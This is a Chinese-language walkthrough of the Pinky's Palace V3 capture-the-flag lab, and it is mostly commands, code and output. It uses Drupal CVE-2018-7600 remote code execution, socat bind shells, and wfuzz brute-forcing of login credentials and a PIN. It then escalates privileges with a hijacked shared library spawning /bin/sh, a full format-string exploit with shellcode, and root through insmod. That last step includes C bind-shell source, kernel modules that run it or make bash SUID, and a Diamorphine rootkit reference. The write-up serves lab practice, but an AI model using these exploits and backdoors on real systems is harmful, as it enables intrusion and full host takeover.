
VMware双击打开，网卡选择nat即可！会在项目主页显示IP！

------------------------------------------------------
1、nmap 192.168.4.191 -p- -A
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             173 May 14  2018 WELCOME

5555/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)

8000/tcp open  http    nginx 1.10.3
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: nginx/1.10.3
|_http-title: PinkDrup

------------------------------------------------------
2、FTP信息枚举

ftp 192.168.4.191
anonymous
anonymous

ftp> ls -al
200 PORT command successful. Consider using PASV.
需要使用pasv密匙：passive   ---https://www.cnblogs.com/yjf512/p/13206048.html
passive    
ls -al
-rw-r--r--    1 0        0             173 May 14  2018 WELCOME
get WELCOME

存在：WELCOME文件，下载

file WELCOME  
WELCOME: ASCII text
文本类型！

Welcome to Pinky's Palace V3

Good Luck ;}

I encourage you to be creative, try and stay away from metasploit and pre-made tools.
You will learn much more this way!

~Pinky

让我们尽量不要使用metasploit工具！！

cd ...
cd .bak
-rwxr--r--    1 0        0             190 May 15  2018 firewall.sh
get firewall.sh

----------
cat firewall.sh 
#!/bin/bash
#FIREWALL

iptables -A OUTPUT -o eth0 -p tcp --tcp-flags ALL SYN -m state --state NEW -j DROP
ip6tables -A OUTPUT -o eth0 -p tcp --tcp-flags ALL SYN -m state --state NEW -j DROP
----------
存在防火墙，进行了限制，对应了上welcome文件内容，不能使用metasploit工具进行反向shell流量攻击！

------------------------------------------------------
------------------------------------------------------
3、web信息收集 
8000/tcp open  http    nginx 1.10.3
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: nginx/1.10.3
|_http-title: PinkDrup

http://192.168.4.191:8000/CHANGELOG.txt
发现：
Drupal 7.57, 2018-02-21
CVE-2018-7600

exp：
https://github.com/Jack-Barradell/exploits/blob/master/CVE-2018-7600/cve-2018-7600-drupal7.py


------------------------------------------------------
------------------------------------------------------
4、webshell

python cve-2018-7600-drupal7.py -h                                                                                                                                       1 ⨯
option -h not recognized
CVE-2018-7600 Remote Code Execution in drupal 7
()
Flags:
	-t --target         - Target url
	-p --port           - Port of webserver
	-c --command        - Command to be executed
()


python cve-2018-7600-drupal7.py -t 192.168.4.203 -c "cat /etc/passwd" -p 8000
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
pinksec:x:1001:1001::/home/pinksec:/bin/bash
pinksecmanagement:x:1002:1002::/home/pinksecmanagement:/bin/bash

权限：
uid=33(www-data) gid=33(www-data) groups=33(www-data)

防火墙：
python cve-2018-7600-drupal7.py -t 192.168.2.177 -c "ls -la /etc/iptables" -p 8000
-rw-r--r--  1 root root  295 May 15  2018 rules.v4
-rw-r--r--  1 root root  285 May 15  2018 rules.v6

查看防火墙配置：
python cve-2018-7600-drupal7.py -t 192.168.4.191 -c "cat /etc/iptables/rules.v4" -p 8000
*filter
:INPUT ACCEPT [714:49326]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [442:57902]
-A OUTPUT -o eth0 -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG SYN -m state --state NEW -j DROP
COMMIT
# Completed on Tue May 15 02:46:06 2018

可以看到防火墙阻止了反向shell，里头的文件都无法正常执行！

------------------------------------------------------
------------------------------------------------------
5、socat-webshell

使用了socat工具，Socat是一个非常强大的工具，可用于调整，旋转和获得完全交互式的外壳！
https://blog.stalkr.net/2015/12/from-remote-shell-to-remote-terminal.html

python cve-2018-7600-drupal7.py -t 192.168.2.177 -c "which socat" -p 8000
[+] Result: /usr/bin/socat   ---已安装



python cve-2018-7600-drupal7.py -t 192.168.2.177 -c "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane" -p 8000

socat FILE:`tty`,raw,echo=0 TCP:192.168.2.177:4444

获得了socat的shell，那么这时候上传文件是无法运行curl、wget等syn流量的！


------------------------------------------------------
------------------------------------------------------
6、base64文件上传
base64 linpeas.sh > 1.txt
gedit 1.txt  ---复制里面的内容

到项目：
vi 1.txt   ---将复制的内容粘贴进去
cat 1.txt | base64 -d > linpeas.sh
md5sum linpeas.sh      
c615333516097ce1a1d6cb185d8435b0  linpeas.sh
文件成功上传！


------------------------------------------------------
------------------------------------------------------
7、内部信息枚举


1）内部IP开放情况：
127.0.0.1:3306
127.0.0.1:65334
127.0.0.1:80

2）密码泄露
      'database' => 'drupal',
      'username' => 'dpink',
      'password' => 'drupink',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',

/lib/libpinksec.so

mysql -udpink -pdrupink 
pinkadmin | $S$DDLlBhU7uSuGiPBv1gqEL1QDM1G2Nf3SQOXQ6TT7zsAE3IBZAgup
无法破解！！

3）64334端口枚举
cd /etc/apache2/sites-available
cat 000-default.conf  发现65334是/home/pinksec/database数据库文件调取用的！
-------
<VirtualHost 127.0.0.1:65334>
	DocumentRoot /home/pinksec/database
	ServerAdmin pinkyadmin@localhost
	<Directory "/home/pinksec/database">
	Order allow,deny
	Allow from all
	Require all granted
	</Directory>
-------

------------------------------------------------------
------------------------------------------------------
8、端口转发

socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
socat TCP-LISTEN:9999,fork TCP:127.0.0.1:65334 &

nmap 192.168.4.191 -p- 
8888/tcp open  sun-answerbook
9999/tcp open  abyss

------------------------------------------------------
------------------------------------------------------
9、Fuzz模糊测试-页面暴力破解-突破pin-webshell

http://192.168.2.177:8888/
访问发现除了要账号密码，还需要Pin登陆！


这里没有sql注入，8888端口映射是65334端口转发出来的！
cd /home/pinksec/database    
bash: cd: /home/pinksec/database: Permission denied
想访问看看数据库信息发现www-data无权限进入查看！

------------------------------------------------------
1）模糊测试-Fuzz
db数据库枚举爆破隐藏文件！

访问：http://192.168.4.203:9999/
提示：DATABASE Under Development

数据库文件爆破方法1：
locate common-tables
/usr/share/sqlmap/data/txt/common-tables.txt

wfuzz -w /usr/share/sqlmap/data/txt/common-tables.txt --sc 200 http://192.168.4.203:9999/FUZZ.db

--sc（show code）  ---显示响应200

000001882:   200        18 L     18 W       221 Ch      "pwds"
发现存在pwds.db！


数据库文件爆破方法2：
使用crunch命令生成暴力破解的字典：参考文章
https://blog.csdn.net/qq_42025840/article/details/81125584


针对五个常见扩展名的列表强制使用最多8个字符的文件名进行爆破：
crunch 1 4 abcdefghijklmnobqrstuvwxyz1234567890 > dayu
生成1544760字典数量！

db.txt：
mdb
db
sql
txt
lst

wfuzz -t 100 -w dayu -w db.txt --sc=200 -c http://192.168.4.203:9999/FUZZ.FUZ2Z
用100的线程进行扫描，大概扫描出


数据库文件爆破方法3：
gobuster dir -u http://192.168.106.150:4466 -w 字典 -x db



访问：
http://192.168.4.203:9999/pwds.db

-------
FJ(J#J(R#J
JIOJoiejwo
JF()#)PJWEOFJ
Jewjfwej
jvmr9e
uje9fu
wjffkowko
ewufweju
pinkyspass
consoleadmin
administrator
admin
P1nK135Pass
AaPinkSecaAdmin4467
password4P1nky
Bbpinksecadmin9987
pinkysconsoleadmin
pinksec133754
-------
发现这是文本信息，猜测是密码文本，爆破！

用户名文本：user.txt
root
pinky
pinksec
pinksecmanagement
pinkadmin    ---数据库枚举到的


Burpsuite抓包：user=1&pass=1&pin=1

账号密码暴力破解思路：


wfuzz -c -z file,./user.txt -z file,./pass.txt -d 'user=FUZZ&pass=FUZ2Z&pin=22222' http://192.168.2.177:8888/login.php

可以看到回显的是错误：45 Ch

wfuzz -c -z file,./user.txt -z file,./pass.txt -d 'user=FUZZ&pass=FUZ2Z&pin=11111' --hh 45 http://192.168.4.203:8888/login.php

参数说明：
-c 用颜色输出，如果不加，那么输出的是没有任何颜色
-z 指定有效的payload(类型，参数，编码，字典等)
-d 指定提交的POST数据，一遍是POST请求的data数据 这里指的就是 "user=FUZZ&pass=FUZ2Z&pin=11111"
-hh 表示隐藏字符的响应信息 本例子中账户密码错误的显示响应的字符是45，正确的是显示41

000000090:   200        0 L      6 W        41 Ch       "pinkadmin - AaPinkSecaAdmin4467"

获得用户名密码信息：
pinkadmin
AaPinkSecaAdmin4467

但是还需要pin密码爆破！！！
Pin密码暴力破解思路：
Crunch生成所有可能的五位数密码：

crunch 5 5 1234567890 > pin    ---生成100000行！


wfuzz -t 150 -w pin -c -d "user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ" --hh 41,45 http://192.168.4.203:8888/login.php

1~2分钟不等，发现：
000044739:   302        0 L      0 W        0 Ch        "55849"


pinkadmin
AaPinkSecaAdmin4467
55849

------------------------------------------------------
------------------------------------------------------
10、pinksec-webshell


登录进去发现执行命令cmd框架：继续利用socat
socat TCP-LISTEN:6666,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane

socat FILE:`tty`,raw,echo=0 TCP:192.168.2.177:6666

成功拿到反弹shell!

------------------------------------------------------
------------------------------------------------------
11、pinksec内部信息枚举

猜测渗透顺序：
www-data->pinksec(10001)->pinksecmanagement（1002）->pinky（1000）

linpeas枚举发现SUID：
-rwsr-xr-x 1 pinksecmanagement pinksecmanagement 7.4K May 13  2018 /home/pinksec/bin/pinksecd
-rwsrwx--- 1 pinky             pinksecmanagement 7.3K May 14  2018 /usr/local/bin/PSMCCLI

下一步是要提权pinksecmanagement存在pinksecd文件可以执行！


------------------------------------------------------
------------------------------------------------------
12、共享库提权

cd /home/pinksec/bin/
cp pinksecd ../html
这时候就能在web页面访问了！


file pinksecd
ELF 32-bit LSB pie executable

gdb-peda$ info function   ---没发现使用了另类的函数！


ldd —— Print shared library dependencies，打印出库中的依赖关系：
ldd pinksecd 
	linux-gate.so.1 (0xf7f50000)
	libpinksec.so => not found
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d40000)
	/lib/ld-linux.so.2 (0xf7f52000)

可以看到libpinksec.so未找到，该程序调用了.so库文件！

学过udf提权都知道，可以创建.so恶意库，让程序调用反弹shell！

find / -name libpinksec.so 2>/dev/null
/lib/libpinksec.so
ls -la /lib/libpinksec.so
-rwxrwxrwx 1 root root 7136 May 14  2018 /lib/libpinksec.so
在libpinksec.so共享库中加载的函数!并且可以写入！


Linux共享对象：

在Linux上可以使用C语言创建两种共享库。
1）静态链接库：它们保存为 .a 文件并作为应用程序的一部分进行链接。
2）动态链接库：它们保存为 .so 文件并在运行时加载。

动态库是在运行时加载的，分配给它们的地址可能会随着每次调用而改变，因此库代码与位置不是非常重要（它不应该依赖于任何固定的内存地址）。在制作.so文件之前，需要了解.so文件中的内容。通常是一个.so文件的某些方法列表，也就是应用程序将使用的函数。

nm工具可用于列出共享库中的符号：
nm -g /lib/libpinksec.so
         w _ITM_deregisterTMCloneTable
         w _ITM_registerTMCloneTable
         w _Jv_RegisterClasses
00002018 B __bss_start
         w __cxa_finalize@@GLIBC_2.1.3
         w __gmon_start__
00002018 D _edata
0000201c B _end
00000608 T _fini
000003ec T _init
         U printf@@GLIBC_2.0
000005ab T psbanner
00000580 T psopt
000005d6 T psoptin
         U puts@@GLIBC_2.0
有许多函数，如_init、_fini、psbanner、psopt、psoption等，前两个是编译器使用的内置方法，可以根据需要覆盖它们！_init是加载库时调用的第一个方法！这里可以覆盖第一个函数也可以覆盖多个！不建议覆盖_init！

--------
#include <stdlib.h>

int psbanner() {
    return system("/bin/sh");
  }
int psopt() {
  return system("/bin/sh");
}
int psoptin() {
  return system("/bin/sh");
}
--------

可以使用以下gcc命令将此代码编译为共享库：
gcc -shared -o shell.so -fPIC shell.c


如果想要覆盖_init函数，请按如下方式编译代码：
gcc -shared -o shell.so -fPIC -nostartfiles shell.c

--------------------------------
-shared   ---生成共享目标文件。通常用在建立共享库时。
https://www.runoob.com/w3cnote/gcc-parameter-detail.html

-fPIC   ---参数参考链接：
https://blog.csdn.net/Edidaughter/article/details/120276374?spm=1001.2101.3001.6650.10&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-10.pc_relevant_antiscanv2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-10.pc_relevant_antiscanv2&utm_relevant_index=17

-nostartfiles    ---参考链接
http://blog.pickbox.cc/2007/07/06/GCC-命令行选项-nodefaultlibs-nostartfiles-nostdlib/
--------------------------------

vi shell.c
gcc -shared -o shell.so -fPIC shell.c
cp shell.so /lib/libpinksec.so
./pinksecd
uid=1001(pinksec) gid=1001(pinksec) euid=1002(pinksecmanagement) groups=1001(pinksec)

成功获得pinksecmanagement权限！


------------------------------------------------------
------------------------------------------------------
13、ssh rsa 稳定shell

cat id_rsa.pub
cd /home/pinksecmanagement
cd .ssh
echo 'key值放进来' > authorized_keys

ssh pinksecmanagement@192.168.2.177 -p 5555
成功登录！


------------------------------------------------------
------------------------------------------------------
14、格式字符串-缓冲区溢出提权

linpeas 枚举发现：橙色
You can write SUID file: /usr/local/bin/PSMCCLI

-rwsrwx---  1 pinky pinksecmanagement 7396 May 14  2018 PSMCCLI
可看到该二进制程序的UID为pinky用户权限，那么这里溢出后拿到的就是pinky权限了！


base64 PSMCCLI
vi base64.txt
cat base64.txt | base64 -d > PSMCCLI
chmod +x PSMCCLI
下载到本地！

./PSMCCLI dayu
[+] Args: dayu


1）测试是否存在缓冲区溢出

./PSMCCLI $(python -c 'print "A"*2000')   ---发现无法将其崩溃！！！

disas：
argshow用于显示参数，被main函数调用，可以在argshow中看到两个printf调用，printf调用可能会产生格式字符串漏洞！

%x是printf支持的格式字符串！用来显示关联十六进制输入数值！
从堆栈中获取一个值：
./PSMCCLI %x
[+] Args: f7f1f480

可查看该二进制程序会受到格式字符串漏洞的影响导致溢出！


2）查看二进制程序启用的安全保护

ELF 安全特性检查工具：hardening-check

参考文章：
http://manpages.ubuntu.com/manpages/trusty/man1/hardening-check.1.html
执行完会提示安装，安装下即可！1分钟~

PSMCCLI:
 Position Independent Executable: no, normal executable!
 Stack protected: no, not found!    ---堆栈保护
 Fortify Source functions: no, only unprotected functions found!
 Read-only relocations: yes  ----只读重定位
 Immediate binding: no, not found!
 Stack clash protection: unknown, no -fstack-clash-protection instructions found 
 Control flow integrity: no, not found!

七种安全机制六种都显示no, not found!！
没有保护措施，这是一个简单直接的格式字符串漏洞


格式字符串允许利用两个基本的攻击向量：
1. 直接内存访问：使用 %x 格式字符串和位置值，可以打印或访问堆栈中的任何内存位置。
2. 写入位置的能力：可以使用 %n 格式字符串写入任何位置，%n 将到目前为止打印的字符数写入所选位置。


3）shellcode

http://shell-storm.org/shellcode/files/shellcode-827.php

char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

利用格式字符串漏洞，通常将shell代码放在环境变量中，并将程序流重定向到环境变量的地址即可！


将偏移量移/tmp目录中，并对其进行排序：
export SPAWN=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")


4）定位环境变量的地址

这边思路覆盖putchar函数，因为它是printf之后的下一个函数，要获取需要覆盖的位置，我在运行程序之前先拆装了putchar函数，方便包含它在运行时加载的地址：

gdb PSMCCLI
disas putchar
0x804a01c


当环境变量中植入shellcode后，需要找到覆盖覆盖函数的地址！
植入shellcode需要找到地址该脚本可以找：
https://raw.githubusercontent.com/Partyschaum/haxe/master/getenvaddr.c

---------------------
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	char *ptr;

	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]); /* get env var location */
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
	printf("%s will be at %p\n", argv[1], ptr);
}
--------------------
将保存到：getenvaddr.c

nano getenvaddr.c
gcc -o getenvaddr getenvaddr.c
chmod +x getenvaddr

./getenvaddr
Usage: ./getenvaddr <environment variable> <target program name>


前面已经将shellcode放入环境变量中了，现在可以使用SPAWN在执行目标二进制文件期间找到环境变量在内存中的位置：
./getenvaddr SPAWN /usr/local/bin/PSMCCLI
SPAWN will be at 0xbffffe93

shellcode地址：0xbffffe93    ---要覆盖的内存地址
putchar地址：0x0804a01c      ---写入的地址
所以此时有两个地址，需要将shell代码的地址写入putchar的指针存放位置。


5）确认Args位置

此时有两个地址需要将shell代码的地址写入putchar的指针存放位置即可！

现在的目标是在参数中引入一些地址并尝试访问它们！在参数中引入了两个地址 AAAA (0x41414141) 和 BBBB (0x42424242)！还需要第三位填充（CCC）！

/usr/local/bin/PSMCCLI AAAABBBBCCC$(python -c "print '%x.'*138")
......50.494c43.41414141.42424242.43434343......
可看到它们分布在两个内存中！

这里确认位置可以用for循环，也可以猜解！

/usr/local/bin/PSMCCLI AAAABBBBCC%137\$x%138\$0x
[+] Args: AAAABBBBCCC4141414142424242
如果不起作用，就用填充C即可！！


6）exp-地址前半段确定

现在需要访问putchar指针的地址（要修改的地址），即0x0804a01c！32位架构中的内存为4字节（32位）大小。然而将使用格式字符串漏洞进行写入也就是两字节写入。所以需要把地址分成两个字节：

低位地址：0x0804a01c
高位地址：0x0804a01e（初始地址+2）   

地址字节的顺序是颠倒写的：
/usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CC%137\$x%138\$0x
[+] Args: CC4a01c004a01e08

前半部分可以访问所需的地址值了！


7）exp-确认地址后半段（一）

只需将%x更改为%n即可！使用%x访问的内存位置！

/usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CC%137\$n%138\$n
Segmentation fault
这里提示分段错误，为什么？
这边出现了分段错误，因为％n会将到目前为止已打印的字符数写入正在访问的内存中，上面的代码会将11(0xb)写入高位和低位存储短字节中，这是一个非法地址，所以报错！


8）shellcode地址位置计算（二）

需要将值0xbffffe93写入内存字节中，每个短字节最多只能容纳0xffff，因此需要将值拆分为两个短字节：

shellcode地址：0xbffffe93

打开计算器：选择程序员->HEX

低位短字节地址: 0xfe76 = 65171   
高位短字节地址: 0xbfff = 49151


/usr/local/bin/PSMCCLI AAAABBBBCCC%137\$x%138\$0x
AAAABBBBCCC（11个字节）两个四字节和三个C填充！

前半部分=49151 后半部分=65171-11bytes = 65160
接下来使用%u格式说明符来引入那么多额外的字符即可！



9）整数溢出思路写法

现在修复了低位短字节，需要将0xbfff写入高位短字节然后0xbff（3071）低于0xfe93！
因此需要0x1bfff-0xfe93=49516个字符来写入所需的0xbfff值！
**强调**：这里需要计算器直接计算十六进制值，不要加减法单独计算！

65160
49516
用了三个C

/usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CCC%65160u%137\$hn%49516u%138\$hn

hn  ----指printf进行短位字节

最终payload：
/usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CCC%65160u%137\$hn%49516u%138\$0hn


10）写入ssh rsa

cat id_rsa.pub
cd /home/pinky
cd .ssh
echo 'key值放进来' > authorized_keys
ssh pinky@192.168.2.177 -p 5555

成功登录pinky用户权限shell！



------------------------------------------------------
------------------------------------------------------
15、pinky-提权

sudo -l
User pinky may run the following commands on pinkys-palace:
    (ALL) NOPASSWD: /sbin/insmod
    (ALL) NOPASSWD: /sbin/rmmod

rmmod提权：
https://github.com/m0nad/Diamorphine

proxychains git clone https://github.com/m0nad/Diamorphine


scp上传：
scp -P 5555 -i id_rsa -r Diamorphine pinky@192.168.2.177:/tmp
成功上传！

cd Diamorphine
make

有了rootkit之后，进行设置:
sudo insmod diamorphine.ko

/sbin/insmod


https://github.com/PinkP4nther/Pinkit.git


chown root:root /tmp/shell; chmod u+s /tmp/shell



绕过防火墙限制：bindshell.c为32位平台编译!
----------------------------------------
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char* argv[]) {

  int host_sock = socket(AF_INET, SOCK_STREAM, 0);

  struct sockaddr_in host_addr;
  host_addr.sin_family = AF_INET;
  host_addr.sin_port = htons(atoi(argv[1]));
  host_addr.sin_addr.s_addr = INADDR_ANY;

  bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
  listen(host_sock, 0);

  int client_sock = accept(host_sock, NULL, NULL);
  dup2(client_sock, 0);
  dup2(client_sock, 1);
  dup2(client_sock, 2);

  execve("/bin/bash", NULL, NULL);
}
----------------------------------------
gcc -m32 -o bindshell bindshell.c
./bindshell 4455
nc x.x.x.x 4455



参考：https://developer.ibm.com/articles/l-user-space-apps/
编写了一个内核模块，调用绑定/tmp/bindshell来监听9999/tcp！
----------------------------------------root.c
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void)
{
  char *argv[] = { "/tmp/test1/bindshell", "7777", NULL };
  static char *envp[] = {
    "HOME=/tmp/",
    "TERM=xterm",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

  return 0;
}

void cleanup_module(void)
{
  printk(KERN_INFO "Goodbye!");
}
----------------------------------------

Makefile：
----------------------------------------
obj-m += root.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
----------------------------------------
make



或者：别的方法

http://shell-storm.org/shellcode/files/shellcode-882.php
gcc -fno-stack-protector -z execstack bindshell.c -o bindshell
./bindshell
nc 192.168.2.177 31337
----------------------------------------
#include <linux/module.h>  
#include <linux/kernel.h>  

int init_module(void)
{
        char *envp[] = {
                                "HOME=/tmp",
                                "TERM=xterm",
                                NULL
                        };

        char *argv[] = {
                                "/bin/bash",
                                "-c",
                                "chown -R root:root /tmp/bash && chmod u+s /tmp/bash",
                                NULL
                        };

        printk(KERN_INFO "[+] Command Execution Begin\n");
        call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
        printk(KERN_INFO "[+] Command Execution End\n");
        return 0;

}

void cleanup_module(void)
{
  printk(KERN_INFO "Bye Those Guys!\n");
} 
----------------------------------------



https://github.com/PinkP4nther/Pinkit





















